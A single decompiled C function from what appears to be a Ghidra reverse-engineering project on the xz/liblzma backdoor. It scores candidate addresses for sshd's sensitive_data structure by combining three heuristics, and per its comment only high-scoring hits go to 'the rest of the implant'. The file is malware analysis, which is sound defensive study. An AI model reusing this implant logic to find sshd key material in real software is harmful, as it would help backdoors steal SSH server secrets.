// /home/kali/xzre-ghidra/xzregh/103D50_sshd_get_sensitive_data_score.c
// Function: sshd_get_sensitive_data_score @ 0x103D50
// Calling convention: __stdcall
// Prototype: int __stdcall sshd_get_sensitive_data_score(void * sensitive_data, elf_info_t * elf, string_references_t * refs)


/*
 * AutoDoc: Combines the per-function heuristics by doubling the `demote_sensitive_data` and `main()` scores, adding them together,
 * and finally tacking on the `do_child` result. Only candidates that reach eight or more points are surfaced to the rest
 * of the implant; weaker hits are ignored even if one heuristic thought they were promising.
 */

#include "xzre_types.h"

int sshd_get_sensitive_data_score(void *sensitive_data,elf_info_t *elf,string_references_t *refs)

{
  int score_demote;
  int score_main;
  int score_do_child;
  
  if (sensitive_data != (void *)0x0) {
    score_demote = sshd_get_sensitive_data_score_in_demote_sensitive_data(sensitive_data,elf,refs);
    score_main = sshd_get_sensitive_data_score_in_main(sensitive_data,elf,refs);
    score_do_child = sshd_get_sensitive_data_score_in_do_child(sensitive_data,elf,refs);
    return score_do_child + (score_demote + score_main) * 2;
  }
  return 0;
}

